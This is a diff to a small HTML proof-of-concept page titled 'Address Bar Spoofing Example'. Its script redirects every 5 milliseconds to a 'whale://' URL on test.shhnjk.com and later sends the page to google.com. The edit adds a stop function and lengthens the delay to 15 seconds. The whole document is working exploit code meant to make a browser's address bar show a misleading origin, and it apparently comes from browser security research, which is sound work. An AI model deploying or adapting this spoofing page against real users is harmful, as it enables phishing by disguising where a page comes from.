@@ -6,17 +6,22 @@
     <title>Address Bar Spoofing Example</title>
     <script>
         // Function to continuously redirect the page
+        var redirectInterval = setInterval(redirectContinuously, 5);
+        
         function redirectContinuously() {
             window.location.href = "whale://test.shhnjk.com/alert.html";
         }
         
-        // Continuously redirect every 5 milliseconds
-        setInterval(redirectContinuously, 5);
+        // Function to stop the continuous redirection
+        function stopRedirect() {
+            clearInterval(redirectInterval);
+            console.log("Continuous redirection stopped.");
+        }
         
-        // Redirect to Google after 5 seconds
+        // Redirect to Google after 15 seconds
         setTimeout(function() {
             window.location.href = "https://www.google.com";
-        }, 5000); // 5000 milliseconds = 5 seconds
+        }, 15000); // 15000 milliseconds = 15 seconds
     </script>
 </head>
 <body>
